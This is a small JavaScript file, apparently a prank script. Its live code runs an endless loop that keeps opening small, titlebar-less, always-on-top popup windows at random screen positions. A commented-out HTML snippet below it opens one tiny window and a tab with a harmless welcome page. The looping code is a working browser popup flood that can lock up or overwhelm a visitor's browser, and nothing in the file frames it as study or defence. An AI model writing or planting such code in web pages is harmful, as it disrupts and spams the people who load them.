(function () {
    function openWindow(url) {
        const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
        if (newWin) {
            const screenWidth = screen.width - 200; // Keep within bounds
            const screenHeight = screen.height - 180;

            const randomX = Math.floor(Math.random() * screenWidth);
            const randomY = Math.floor(Math.random() * screenHeight);

            newWin.moveTo(randomX, randomY);

            return newWin;
        }
    }
    while (true) openWindow('');
})();

/*
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Windows</title>
</head>
<body>
    <button onclick="openWindows()">Open Windows</button>

    <script>
        function openWindows() {
            // Open 4 small windows at the bottom of the screen
            for (let i = 0; i < 1; i++) {
                let newWin = window.open('about:blank', '_blank', 'width=100,height=100,resizable=no,scrollbars=no');
newWin.moveTo(0, screen.height);
            }

            // Open a new tab with custom HTML content
            let newWindow = window.open('about:blank', '_blank');
            newWindow.document.write(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Custom HTML</title>
                </head>
                <body>
                    <h1>Welcome to your custom HTML page!</h1>
                    <p>This is a custom message.</p>
                </body>
                </html>
            `);
        }
    </script>
</body>
</html>
*/
